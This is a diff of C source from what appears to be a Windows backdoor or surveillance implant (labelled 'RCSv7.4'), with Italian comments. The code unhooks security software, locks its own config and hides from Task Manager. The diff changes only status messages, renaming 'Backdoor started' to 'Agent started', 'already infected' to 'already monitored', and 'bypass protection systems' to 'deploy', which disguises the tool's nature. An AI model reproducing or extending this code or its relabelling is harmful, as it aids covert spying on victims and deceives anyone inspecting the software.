@@ -2571,7 +2571,7 @@ void __stdcall HM_sMain(void)
 	if (!CreateLogWindow())
 		FNC(ExitProcess)(0);
 
-	REPORT_STATUS_LOG("- Checking modules..............");
+	REPORT_STATUS_LOG("- Checking components...........");
 
 	// Locka il file di configurazione per prevenire cancellazioni "accidentali"
 	LockConfFile();
@@ -2589,7 +2589,7 @@ void __stdcall HM_sMain(void)
 
 	// Toglie gli hook, prende i privilegi, etc.
 	if (!doUnhook()) {
-		REPORT_STATUS_LOG("ERROR\r\n    17240 [Unable to bypass protection systems]\r\n"); 
+		REPORT_STATUS_LOG("ERROR\r\n    17240 [Unable to deploy]\r\n"); 
 		ReportExitProcess();
 	} 
 	REPORT_STATUS_LOG("OK\r\n"); 
@@ -2609,9 +2609,9 @@ void __stdcall HM_sMain(void)
 	
 	// L'agent manager deve essere startato prima di effettuare gli hook 
 	// (infatti e' lui che inizializza tutta la parte di IPC).
-	REPORT_STATUS_LOG("- Initializing agents...........");
+	REPORT_STATUS_LOG("- Initializing modules..........");
 	if (!AM_Startup()) {
-		REPORT_STATUS_LOG("ERROR\r\n    29310 [The system is already infected]\r\n"); 
+		REPORT_STATUS_LOG("ERROR\r\n    29310 [The system is already monitored]\r\n"); 
 		ReportExitProcess(); // AM_Startup fallisce se la sharedmemory gia' esiste
 	}
 	REPORT_STATUS_LOG("OK\r\n"); 
@@ -2647,8 +2647,8 @@ void __stdcall HM_sMain(void)
 	// Fa partire il sync manager 
 	SM_StartMonitorEvents();
 
-	REPORT_STATUS_LOG("\r\n RCSv7.4 fully operational\r\n\r\n");
-	SendStatusLog(L"[Core Module]: Backdoor started");
+	REPORT_STATUS_LOG("\r\n Version 8.0 fully operational\r\n\r\n");
+	SendStatusLog(L"[Core Module]: Agent started");
 
 	// Ciclo per l'hiding da task manager e dai nuovi epxlorer
 	// lanciati. Monitora anche la coda dei messaggi per
